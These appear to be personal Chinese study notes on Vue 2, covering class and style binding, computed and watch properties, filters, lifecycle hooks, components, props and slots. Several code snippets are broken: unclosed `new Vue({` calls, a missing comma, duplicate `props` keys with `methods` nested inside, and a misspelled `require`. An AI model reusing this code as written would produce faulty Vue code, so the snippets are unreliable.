​    适用于：要绑定的样式个数不确定、名字也不确定

```html
<style> 
    /*  边框颜色：可多个 */
    .atguigu1 { background-color: yellowgreen;  }
    .atguigu2 {
        font-size: 30px;
        text-shadow: 2px 2px 10px red; }
    .atguigu3 {border-radius: 20px;}
</style>
<div id="root">
    <!-- 绑定class样式--数组写法 -->
    <div class="basic" :class="classArr">数组写法</div> <br />
</div>
<script src="../js/vue.js"></script>
<script>
    new Vue({
        el: "#root",
        data: {
            classMood: "normal", //心情数组-心情一般
            classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
            classObj: {
                atguigu1: true,
                atguigu2: false
            }
        }
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%91%E5%AE%9Acss%E6%A0%B7%E5%BC%8F-%E6%95%B0%E7%BB%84.png)

###### 对象:

```html
<style> 
    /*  边框颜色：可多个 */
    .atguigu1 { background-color: yellowgreen;  }
    .atguigu2 {
        font-size: 30px;
        text-shadow: 2px 2px 10px red; }
    .atguigu3 {border-radius: 20px;}
</style>
<div id="root">
    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
    <div class="basic" :class="classObj">对象写法</div> <br />
</div>
<script src="../js/vue.js"></script>
<script>
    new Vue({
        el: "#root",
        data: {
            classMood: "normal", //心情数组-心情一般
            classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
            classObj: {
                atguigu1: true,
                atguigu2: false
            }
        }
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%91%E5%AE%9Acss%E6%A0%B7%E5%BC%8F-%E5%AF%B9%E8%B1%A1.png)



## style:

注意：有-的必须写成小驼峰

### 对象：

#### 对象+字符串拼接：

```html
<div id="root">
    <h2>绑定sytle样式--数组，对象写法</h2>
    <div class="basic" :style="{fontSize:fsize +'px;'}">对象写法</div>
</div>
<script>
    new Vue({
        el: "#root",
        data: {
            fsize: 40, //加号两边必须有空格
        }
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%91%E5%AE%9Astyle%E6%A0%B7%E5%BC%8F-%E5%AF%B9%E8%B1%A1_%E5%AF%B9%E8%B1%A1+%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5.png)

###### 对象：

```html
<div id="root">
    <h2>绑定sytle样式--数组，对象写法</h2>
    <div class="basic" :style="styleObj">对象写法</div>
</div><script src="../js/vue.js"></script>
<script>
    new Vue({
        el: "#root",
        data: {
            fsize: 40+'px', //加号两边必须有空格
            styleObj: {
                fontSize: '40px',
                color: 'red'
            },
        }
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%91%E5%AE%9Astyle%E6%A0%B7%E5%BC%8F-%E5%AF%B9%E8%B1%A1_%E5%AF%B9%E8%B1%A1%E5%90%8D.png)

#### 数组：

##### 数组

```html
<div id="root">
    <h2>绑定sytle样式--数组，对象写法</h2>
    <div class="basic" :style="[styleObj,styleObj2]">数组写法1</div>
</div><script src="../js/vue.js"></script>
<script>
    new Vue({
        el: "#root",
        data: {
            fsize: 40+'px', //加号两边必须有空格
            styleObj: {
                fontSize: '40px',
                color: 'red'
            },
            styleObj2: {
                backgroundColor: '#ccc'
            }}
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%91%E5%AE%9Astyle%E6%A0%B7%E5%BC%8F-%E6%95%B0%E7%BB%84%E5%86%99%E6%B3%95.png)

##### 数组名：

```html
<div id="root">
    <h2>绑定sytle样式--数组，对象写法</h2>
    <div class="basic" :style="styleObj3">数组写法2</div>
</div><script src="../js/vue.js"></script>
<script>
    new Vue({
        el: "#root",
        data: {
            fsize: 40+'px', //加号两边必须有空格
            styleObj3: [
                {
                    borderRadius: '20px',
                    backgroundColor: 'pink'
                }, {
                    fontSize: '33px', //注意：有-的必须写成小驼峰
                }
            ]
        }
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%91%E5%AE%9Astyle%E6%A0%B7%E5%BC%8F-%E6%95%B0%E7%BB%84%E5%90%8D%E5%86%99%E6%B3%95.png)



# 计算属性与监视属性：

计算属性与监视属性的**区别**：**计算属性**不能开启异步任务去维护数据的。



## computed_计算属性：

1.定义：要用的属性不存在，要通过已有属性计算得来。
2.原理：底层借助了Object.defineproperty方法提供的getter和setter。 
3.get函数什么时候执行？
    ①初次读取时会执行一次。
    ②当依赖的数据反生改变时会被再次调用。
4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
5备注：
   ①计算属性最终会出现在vm上，直接读取使用即可。
   ②如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据反生改变。

### 计算属性：

```js
computed: { //计算属性
    fullName: {
        //get有什么作用？当有人读取fullName时,get就会被调用，且返回值就作为fullName的值。
        //get什么时候调用？1.初次读取fullName时。 2.所依赖的数据反生变化时。
        get() {  // 有缓存。
            return this.firstName + '-' + this.lastName;
        },
            //set什么时候调用？当fullName被修改时。
            set(value) { //修改值
                console.log("set", value);
                const arr = value.split('-'); //通过-分割
                this.firstName=arr[0];
                this.lastName=arr[1];
            }
    }
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/computed_%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7.png)

### 计算属性-简写：

```json
const vm = new Vue({
    el: "#root",
    data: { // 数据区
        firstName: "张",
        lastName: "三",
    },
    computed: {
        fullName() { //简写：只有get（读取），没有set（修改）
            return this.firstName + '-' + this.lastName;
        }
    }
})
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/computed_%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7-%E7%AE%80%E5%86%99.png)

## watch_监视属性:

### 监视属性的两种写法：

```
监视属性watch:
       1.当被监视的属性变化时，回调函数自动调用，进行相关操作。
       2.监视的属性必须存在，才能进行监视！！！
       3.监视的两种写法：
          ①new Vue时传入watch配置
          ②通过.$watch监视
       4.监视数据：
          单级监视数据：
          监视多级数据：
              ①字符串：
              ②深度监视：
```



#### new Vue时传入watch监视：

##### 默认写法:

```js
watch: { //监控属性
    isHot: {
        immediate:true, //1开始就自动执行 (初始化时就调用handler方法)
            // handler什么时候调用？当isHot反生改变时调用。
            handler(newValue, oldValue) { // 新的值：newValue   旧的值：oldValue
            console.log("isHot被修改了", newValue, oldValue);
        }
    }
}
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7-%20new%20Vue%E6%97%B6%E4%BC%A0%E5%85%A5watch%E9%85%8D%E7%BD%AE.png)



##### 简写：

  注意：简写的监控属性只有handler，而没有其他。例：没有immediate和deep)

```js
watch: { //监控属性-简写  
    isHot(newValue, oldValue) { // 新的值：newValue   旧的值：oldValue
        console.log("isHot被修改了", newValue, oldValue);
    }
}
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7-%20new%20Vue%E6%97%B6%E4%BC%A0%E5%85%A5watch%E9%85%8D%E7%BD%AE%E2%80%94%E7%AE%80%E5%86%99.png)



#### 通过.$watch监视：

##### 默认写法：

```js
vm.$watch('isHot', {
    immediate: true,//1开始就自动执行 (初始化时就调用handler方法)
    handler(newValue, oldValue) {  // handler什么时候调用？当isHot反生改变时调用。
        console.log("isHot被修改了", newValue, oldValue);
    }
})
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7-%20%E9%80%9A%E8%BF%87.$watch%E7%9B%91%E8%A7%86.png)



##### 简写：

```js
vm.$watch("isHot", function ( newValue, oldValue) {
    console.log("isHot被修改了-简写方式2", newValue, oldValue);
})
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7-%20%E9%80%9A%E8%BF%87.$watch%E7%9B%91%E8%A7%86%E2%80%94%E7%AE%80%E5%86%99.png)



## 监视数据：

​     1.单级监视数据：
​      2.监视多级数据：
​              ①字符串：
​              ②深度监视：

### 单级监视：

   单级监视：可查看上面监视数据的两种写法，这里就不重复了。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7-%20new%20Vue%E6%97%B6%E4%BC%A0%E5%85%A5watch%E9%85%8D%E7%BD%AE%E2%80%94%E7%AE%80%E5%86%99.png)



### 监视多级数据：

①.字符串。
②.深度监视。

```js
①Vue中的watch默认不检测对象内部值的改变（一层）  。
②配置deep:true可以检测对象内部值改变（多层）。
  备注：
     ①Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
     ②使用watch时根据数据的具体结构，决定是否采用深度监视。
```

#### 字符串：

```js
watch: { //监控属性
    // 监视多级结构中某个属性的变化
    'number.b': {
        handler() {
            console.log("b被改变了");
        }
    },
}
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%9B%91%E8%A7%86%E5%A4%9A%E5%B1%82%E6%95%B0%E6%8D%AE-%E5%AD%97%E7%AC%A6%E4%B8%B2.png)



#### 深度监视：

```js
watch: { //监控属性
    // 监视多级结构中所有属性的变化
    number: {
        deep: true, //开启深度监视
            handler() {
            console.log("number被改变了");
        }
    },
}
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%9B%91%E8%A7%86%E5%A4%9A%E5%B1%82%E6%95%B0%E6%8D%AE-%E6%B7%B1%E5%BA%A6%E7%9B%91%E8%A7%86.png)



# Vue修改数组数据：

## Vue.set():

```js
 Vue.set(target,propertyName/index,val)  //语法
```

### 新增：

#### Vue.set()：

```js
Vue.set(要往那添加数据，键，值) //语法
```

```html
<script>
    new Vue({
        el: "#app",
        methods: { //方法区
            addSex() {
         // 方式1 (注意对象不能是Vue实例，或者Vue实例的根数据对象)
                Vue.set(this.student, 'sex', '女');
            }
        },
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/Vue.set()-%E6%96%B0%E5%A2%9E.png)



#### this.$set()：

```js
 this.$set(target,propertyName/index,val)  //语法
 this.$set(要往那添加数据，键，值)  //语法
```

```html
<script>
    new Vue({
        el: "#app",
        methods: { //方法区
            addSex() {
                this.$set(this.student, 'sex', '男'); 
            }
        },
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/Vue.set()-%E6%96%B0%E5%A2%9E2.png)

### 修改：

```js
Vue.set(要替换数组，索引值，替换值)  //语法
```

```html
<script>
    new Vue({
        el: "#app",
        methods: { //方法区
            updHobby() {
                //要替换数组,索引值，替换值
                Vue.set(this.student.hobby, 0, '泡妞'); //修改
            }
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/Vue.set()-%E4%BF%AE%E6%94%B9.png)



## API:

# filter_过滤器：（Vue3移除）

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E8%BF%87%E6%BB%A4%E5%99%A8.png)



## 定义过滤器：

### 全局过滤器：

```html
<div id="root">
    <h3>{{msg | mySlice}}</h3>
</div>
<div id="root2">
    <h3>{{msg | mySlice}}</h3>
</div>
<script>
    //定义全局过滤器 (必须在new Vue之前定义)
    Vue.filter('mySlice', function (value) {
        return value.slice(0, 4);//截取0到4位数
    })
    const vm= new Vue({
        el: "#root",
        data: {
            time: Date.now(), //获取当前时间的时间戳
            msg: '你好，尚硅谷'
        },
    })
    const vm2 =   new Vue({
        el: "#root2",
        data: {
            msg: '尚硅谷'
        },
    }),
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%85%A8%E5%B1%80%E8%BF%87%E6%BB%A4%E5%99%A8.png)

### 局部过滤器：

```html
<div id="root"> <!-- 过滤器实现 -->
    <h3>{{time | timeFormater}}</h3>
</div>
<script src="../js/vue.js"></script>
<script src="../js/dayjs.min.js"></script> <!-- 时间处理插件 -->
<script>
    new Vue({
        el: "#root",
        data: {
            time: Date.now(), //获取当前时间的时间戳
        },
        filters: { //局部过滤器： 注意：过滤器本质是函数
            timeFormater(value) {//处理日期插件
                //要转换的时间戳，要装换的格式
                return dayjs(value).format('YYYY年MM月DD HH:mm:ss');
            }
        })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%B1%80%E9%83%A8%E8%BF%87%E6%BB%A4%E5%99%A8%E2%80%94%7B%7Bxxx-%E8%BF%87%E6%BB%A4%E5%99%A8%E5%90%8D%7D%7D.png)



## 过滤器参数：

#### 无参：

```html
<div id="root"> <!-- 过滤器实现 -->
    <h3>{{time | timeFormater}}</h3>
</div>
<script src="../js/vue.js"></script>
<script src="../js/dayjs.min.js"></script> <!-- 时间处理插件 -->
<script>
    new Vue({
        el: "#root",
        data: {
            time: Date.now(), //获取当前时间的时间戳
        },
        filters: { //局部过滤器： 注意：过滤器本质是函数
            timeFormater(value) {//处理日期插件
                //要转换的时间戳，要装换的格式
                return dayjs(value).format('YYYY年MM月DD HH:mm:ss');
            }
        })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%B1%80%E9%83%A8%E8%BF%87%E6%BB%A4%E5%99%A8%E2%80%94%7B%7Bxxx-%E8%BF%87%E6%BB%A4%E5%99%A8%E5%90%8D%7D%7D.png)



#### 带参：

```html
<div id="root"> <!-- 过滤器实现  (无参) -->
    <h3>{{time | timeFormater}}</h3>
    <!-- 过滤器实现  (带参)-->
    <h3>{{time | timeFormater('YYYY-MM-DD')}}</h3>
</div>
<script src="../js/vue.js"></script>
<script src="../js/dayjs.min.js"></script> <!-- 时间处理插件 -->
<script>
    new Vue({
        el: "#root",
        data: {
            time: Date.now(), //获取当前时间的时间戳
        },
        filters: { //局部过滤器：
            // 注意：过滤器本质是函数 str参数为空使用默认的'YYYY年MM月DD HH:mm:ss'
            timeFormater(value, str = 'YYYY年MM月DD HH:mm:ss') {//处理日期插件
                //要转换的时间戳，要装换的格式
                return dayjs(value).format(str);
            }
        })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%B1%80%E9%83%A8%E8%BF%87%E6%BB%A4%E5%99%A8%E2%80%94%7B%7Bxxx-%E8%BF%87%E6%BB%A4%E5%99%A8%E5%90%8D%7D%7D-%E5%B8%A6%E5%8F%82.png)



## 使用过滤器：

### {{ xxx | 过滤器名}}：

```html
<div id="root"> <!-- 过滤器实现 -->
    <h3>{{time | timeFormater}}</h3>
</div>
<script src="../js/vue.js"></script>
<script src="../js/dayjs.min.js"></script> <!-- 时间处理插件 -->
<script>
    new Vue({
        el: "#root",
        data: {
            time: Date.now(), //获取当前时间的时间戳
        },
        filters: { //局部过滤器： 注意：过滤器本质是函数
            timeFormater(value) {//处理日期插件
                //要转换的时间戳，要装换的格式
                return dayjs(value).format('YYYY年MM月DD HH:mm:ss');
            }
        })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%B1%80%E9%83%A8%E8%BF%87%E6%BB%A4%E5%99%A8%E2%80%94%7B%7Bxxx-%E8%BF%87%E6%BB%A4%E5%99%A8%E5%90%8D%7D%7D.png)

### v-bind: 属性="xxx | 过滤器名"：

```html
<div id="root"> <!-- 过滤器实现 -->
    <h3 :x="msg | mySlice">尚硅谷</h3>
</div>
<script src="../js/vue.js"></script>
<script>
    new Vue({
        el: "#root",
        data: {
            time: Date.now(), //获取当前时间的时间戳
            msg: 'hello,atguigun!'
        },
        filters: { //局部过滤器： 注意：过滤器本质是函数
            mySlice(value) {
                return value.slice(0, 4); //截取0到4位数
            }
        })
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8%E2%80%94v-bind.png)

# 数据代理：

数据代理： 通过一个对象代理对另一个对象中的属性的操作（读/写）。

​    1.Vue中的数据代理： 通过vm对象来代理data对象中属性的操作（读/写）

​    2.Vue中数据代理的好处：更加方便的操作data中的数据。

​    3.基本原理：

​       ①通过Object.defineProperty()把data对象中所有属性添加到vm上。

​       ②为每一个添加到vm上的属性，都指定一个getter/setter。

​       ③在getter/setter内部去操作（读/写）data中对于的属性。

# 函数：

```js
toUpperCase()   //把小写变成大写字母
indexOf('4') //判断是否有指定值，有返回指定值的索引，无返-1（注意：空字符串返0，字符串里默认带空字符串）
//根据personList数组过滤p。     filter:过滤器
this.personList.filter((per) => {
  return   代码
})    

vsCode里html折叠代码：     
//#endregion   --开始折叠 
//#endregion  --结束折叠

unshift(数据); //在数组的前面添加数据
push(数据); //在数组的后面添加数据
shift(数据); //删除数组第一个数据
pop(数据);    //删除数组最后一个数据
splice();  //根据数组的索引查看指定数据的个数
sort();  //排序数组
reverse(); //反转数组 

// 排序
let arr = [1, 4, 2, 5, 3];  
arr.sort((a, b) => {
    return a - b; //a - b：升序     b -a:降序
})
console.log(arr);   


响应式 ==数据变了，页面也跟着改变。
```



```vue
 {{js表达式}}   <!-- 插值语句-->

 npm run dev <!-- 启动项目模板-->

slice(0,3)  ==> 截取0到第三位。
String str='李-四'.split('-'); //通过-分割
```



```vue
<script> 
    this.$message.success("请输入用户名");  <--! 提示框-->
</script>
```



浏览器控制台：

```js
document.cookie   //获取所有cookie  

node 服务器 //启动服务器   ===>  cmd 
debugger; //断点调试  ===> js
```



# Vue的**生命周期**:

​       Vue的生命周期**别名**:生命周期回调函数、生命周期函数、**生命周期钩子**。

​      生命周期的八个阶段：每触发一个生命周期事件，会自动执行一个生命周期方法，这些生命周期方法也被称为钩子方法。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png)

|                  状态                  |             阶段周期              |
| :------------------------------------: | :-------------------------------: |
|              beforeCreate              |              创建前               |
|                created                 |              创建后               |
|              beforeMount               |              载入前               |
|    <font color='red'>mounted</font>    | <font color='red'>挂载完成</font> |
|              beforeUpdate              |              更新前               |
|                updated                 |              更新后               |
| <font color='red'>beforeDestroy</font> |  <font color='red'>销毁前</font>  |
|               destroyed                |              销毁后               |

生命周期流程图：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B%E5%9B%BE.png)

​      mounted ：挂载完成，Vue初始化成功，HTML页面渲染成功。(在mounted中发送异步请求，加载数据。)

关于销毁Vue实例：
​     1.销毁后借助Vue开发者工具看不到任何信息。
​     2.销毁后自定义事件会失效，但原生DOM事件依然有效。2
​     3.一般不会在deforeDestroy操作数据，因为即便操作数据，也不会在触发更新流程了。



# 组件：

**模块**(前端模块)：向外提供特定功能的 js 程序, 一般就是一个 js 文件

为什么: js 文件很多很复杂 

作用: 复用 js, 简化 js 的编写, 提高 js 运行效率 。

**组件** 

1. 理解: 用来实现局部(特定)功能效果的代码集合(html/css/js/image…..) 

2. 为什么: 一个界面的功能很复杂

  理解：  组件就是一块砖，哪里需要哪里搬。

  **组件分类**：  1.单文件组件   2.非单文件组件

 **使用组件三步骤**：

1. 创建组件
2. 注册组件  
    ①注册全局组件  ②注册局部组件   ③组件名
4. 使用组件  
    ①`<school></school>` 标签     ②`<school />` 自闭标签

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%84%E4%BB%B6%E7%9A%84%E5%AE%9A%E4%B9%89.png)

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%84%E4%BB%B6%E6%96%B9%E6%B3%95%E7%BC%96%E7%A8%8B.png)

## 非单文件组件：

### 全局组件：

```html
<div id="root">
    <!-- 第三步：使用组件 -->
    <student></student>
    <hr />
</div>

<div id="root2">
    <student></student>
</div>
<script src="../js/vue.js"></script>
<script>
    // 第一步：创建student组件
    const student = Vue.extend({
        template: `<div>
                    <h3>学生名称{{name}}</h3>
                    <h3>学生年龄{{age}}</h3>
                 <button @click="showName">点击显示学校名称</button>
                </div>`,
        data() { //数据区
            return {
                name: '张三',
                age: 23,
            }
        },
        methods: { //方法区
            showName() {
                alert("666")
            }
        },
    })

    // 第二步注册组件-全局注册
    Vue.component("student", student);

    //  创建vm
    new Vue({
        el: '#root',
    })

    //  创建vm2
    new Vue({
        el: '#root2',
    })
</script>
```



### 局部组件：

```html
<div id="root">
    <!-- 第三步：使用组件 -->
    <student></student>
    <hr />
</div>
<script src="../js/vue.js"></script>
<script>
    // 第一步：创建student组件
    const student = Vue.extend({
        template: `<div>
                    <h3>学生名称{{name}}</h3>
                    <h3>学生年龄{{age}}</h3>
                 <button @click="showName">点击显示学校名称</button>
                </div>`,
        data() { //数据区
            return {
                name: '张三',
                age: 23,
            }
        },
        methods: { //方法区
            showName() {
                alert("666")
            }
        },
    })

    //  创建vm
    new Vue({
        el: '#root',
        components: {// 第二步注册组件-局部注册
            student,
        }
    })
</script>
```



## 单文件组件:

VsCode使用：

代码提示：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/Vue3Snippets%E6%8F%92%E4%BB%B6.png)

代码高亮插件：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E6%8F%92%E4%BB%B6.png)

## 组件名：

单个单词：

  第一种写法（首字母小写）：school
​  第二种写法（首字母大写）：School

```html
<div id="root">
    <school></school>
    <Student></Student>
</div>

<script src="../js/vue.js"></script>
<script>
    //1.定义组件
    const school = Vue.extend({
        template: ` <div>
<h3>学校名称：{{name}}</h3>
<h3>学校地址：{{address}}</h3>
    </div>`,
        data() {
            return {
                name: '尚硅谷',
                address: '北京'
            }
        }
    })

    //1.定义组件
    const student = Vue.extend({
        template: ` <div>
<h3>学生名称：{{name}}</h3>
<h3>学生年龄：{{age}}</h3>
    </div>`,
        data() {
            return {
                name: '尚硅谷',
                age:23
            }
        }
    })

    new Vue({
        el: '#root',
        //2.注册组件-局部注册
        components: {  
            'school':school
            'Student':school
        }
    })
</script>
```



### 多个单词：

#### 大驼峰命名:

​       注意：大驼峰命名需要Vue脚手架支持运行

```vue

```



#### kebab-case命名:

```html
<div id="root">
    <school-name></school-name>
</div>

<script src="../js/vue.js"></script>
<script>
    //1.定义组件
    const school = Vue.extend({
        template: ` <div>
<h3>学校名称：{{name}}</h3>
<h3>学校地址：{{address}}</h3>
    </div>`,
        data() {
            return {
                name: '尚硅谷',
                address: '北京'
            }
        }
    })

    new Vue({
        el: '#root',
        //2.注册组件-局部注册
        components: {  
            'school-name':school
        }
    })
</script>
```

## 组件嵌套：

​    注意： App组件为所有组件的父类。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%84%E4%BB%B6%E5%B5%8C%E5%A5%97.png)

```html
<div id="root">
    <app> </app>
</div>
<body>
    <script src="../js/vue.js"></script>
    <script>

        // 第一步：创建student组件 （注意：要嵌套的组件必须写在前面）
        const student = Vue.extend({
            template: `<div>
                          <h3>学生名称{{name}}</h3>
                          <h3>学生年龄{{age}}</h3>
                        </div> `,
            data() {
                return {
                    name: '尚硅谷',
                    age: 22,
                }
            }

        })

        // 第一步：创建school组件  学校嵌套学生
        const school = Vue.extend({
            template: `<div>
                           <h3>学校名称：{{name}}</h3>
                           <h3>学校地址：{{address}}</h3>
                           <hr/>
                           <student></student>
                       </div> `,
            data() {
                return {
                    name: '尚硅谷',
                    address: '北京',
                }
            },
            components: {  //第二步註冊組件-局部註冊(嵌套注册)
                student,
            }

        })

        // 第一步：创建hello组件
        const hello = Vue.extend({
            template: `<div>
<h3>你好{{name}}</h3>
        </div> `,
            data() {
                return {
                    name: 'Vue',
                }
            },
        })


        // 第一步：创建app组件 注意：app组件为所有组件的上层
        const app = Vue.extend({
            template: ` <!-- 第三部使用组件 -->
<div>
<school></school>  
<hr/>
<hello></hello>  
        </div>
`,
            components: {   //第二步註冊組件-局部註冊
                school,
                hello,
            }
        })

        //創建vm
        new Vue({
            el: '#root',
            //第二步註冊組件-局部註冊
            components: { app }
        })
    </script>
```

## native修饰符（Vue3移除）：

   组件上要使用原生的DOM事件，则需要使用native修饰符

```vue
<template>
   <div id="app" >
     <Student  @click.native="haha"/>
    </div>
</template>
<script>
    //引入Student组件
    import Student from "./components/Student.vue";
    //默认暴露
    export default {
        name: "App",
        components: { Student }, //注册组件
        methods: {//方法区 
            haha() {
                console.log("haha事件被触发了");
            },  
        }
</script> 
```

Student组件：

```vue
<template>
  <h3 class="txst">
    <h3>学生名称：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
  </h3>
</template>
<script>
export default {
  name: "Student",
  data() {
    return {
      name: "张灵玉",
      sex: "男",
    };
  },
};
</script>
```



## 组件间的通信：

### 父传子：

#### props:

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%88%B6%E7%BB%99%E5%AD%90%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE-props%E6%B5%81%E7%A8%8B%E5%9B%BE.png)

##### App组件：

```vue
<div id="app">
    <!-- 使用组件    props-name等传递数据  -->
    <Student name= "张灵玉" :age= "24" sex= "男" />
    <Student name= "张楚岚" :age= "23" sex= "男" />
</div>
<script>
    //引入Student.vue
    import Student from "./components/Student.vue";
    //默认暴露
    export default {
        name: "App",
        components: {
            //注册组件
            Student,
        },
    };
</script>
```

##### Student组件：

```vue
<template>
<h3>
    <h1>{{ msg }}</h1>
    <h3>学生名称：{{ name }}</h3>
    <h3>学生年龄：{{ myAge + 1 }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <button @click="updateAge">点击修改接受的年龄</button>
    </h3>
</template>
<script>
    export default {
        name: "Student",
        data() {
            return {
                msg: "我是一个尚硅谷的学生",
                myAge: this.age,
            };
        }, 
        props:["name","sex","age"] //props接收数据-数组接收
        ,props:{//props接收数据-对象接收1(接受的同时对数据进行类型限制)
            name: String,
            age: Number,
            sex: String,
            methods: { //方法区
                updateAge() { this.myAge++; },
            }
        }
        ,props: {// props接收数据-对象接收1
            name: {//接受的同时对数据：进行类型限制+默认值的指定+必要性的限制
                type: String, //name的类型的字符串
                require: true, //name是必要的
            },
            age: {
                type: Number, //age的类型的数值
                default: 99, //默认值
            },
            sex: {
                type: String,
                required: true, //sex是必要的
            },
        },
    };
</script>
```

##### 接收数据：

props-接收数据：数组，对象

```vue
<script>
    export default {
        name: "Student",
        data() {
            return {
                msg: "我是一个尚硅谷的学生",
                myAge: this.age,
            };
        },
        props:["name","sex","age"] //props接收数据-数组接收
        ,props:{//props接收数据-对象接收1(接受的同时对数据进行类型限制)
            name: String,
            age: Number,
            sex: String,
            methods: { //方法区
                updateAge() { this.myAge++; },
            }
        }
        ,props: {// props接收数据-对象接收1
            name: {//接受的同时对数据：进行类型限制+默认值的指定+必要性的限制
                type: String, //name的类型的字符串
                require: true, //name是必要的
            },
            age: {
                type: Number, //age的类型的数值
                default: 99, //默认值
            },
            sex: {
                type: String,
                required: true, //sex是必要的
            },
        },
    };
</script>
```



#### slot插槽:

​       1.作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

#####        默认插槽：

```vue
<template>
  <div class="container">
    <h1>注意: 此案例要把bootstrap框架先注掉</h1>
    <!-- 使用组件  
       注意：此处是ListDate同一个参数名传不同参。
       注意：此处title不写成:title也可以传数据，是
      因为不用解析成表达式。
      --> 
    <Category title="美食" :ListDate="foods">
      <img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
    </Category>

    <Category title="游戏" :ListDate="games"/> 
    <Category title="电影" :ListDate="films">
      <video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video> 视频标签
    </Category>

  </div>
</template>

<script scope>
import Category from "./components/Category.vue";

//默认暴露
export default {
  name: "App",
  components: { Category },//注册组件
  data() {
    return {
